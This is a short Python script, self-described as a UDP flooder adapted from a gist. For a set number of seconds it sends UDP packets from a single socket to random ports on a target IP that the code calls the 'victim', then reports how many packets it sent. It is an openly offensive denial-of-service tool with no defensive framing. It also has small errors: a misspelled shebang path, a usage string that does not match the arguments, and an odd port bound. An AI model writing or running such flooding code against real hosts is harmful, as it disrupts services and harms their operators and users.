#!/ust/bin/python3
"""
UDP Flooder.
Adapted from https://gist.github.com/Ananasr/e05f3286b6ab94ec2c5431e64832c13e
Usage : ./flood_udp <ip> <port> <second>
"""
import time
import socket
import random
import sys

def usage():
	print(f"Usage: python3 {sys.argv[0]} <ip> <seconds of attack>")

def flood(victim_ip, duration):
	# open a socket, "SOCK_DGRAM" means UDP type program
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	msg = bytes(random.getrandbits(10))
	timeout = time.time() + duration
	sent_packets = 0

	print(f"Attacking {victim_ip} for {duration} seconds")
	while time.time() < timeout:
		# pick a random port and send the packet
		victim_port = random.randint(1025, 65356)
		sock.sendto(msg, (victim_ip, victim_port))
		sent_packets += 1
		#print(f"Packet sent at the port {victim_port}")
	print(f"Attack finished. Sent {sent_packets} packets.")

def main():
	if len(sys.argv) != 3:
		usage()
		exit(1)
	
	ip_addr = sys.argv[1]
	duration = sys.argv[2]
	# do we need the port at all? Can't we randomize it? Check
	flood(sys.argv[1], int(sys.argv[2]))

if __name__ == '__main__':
	main()
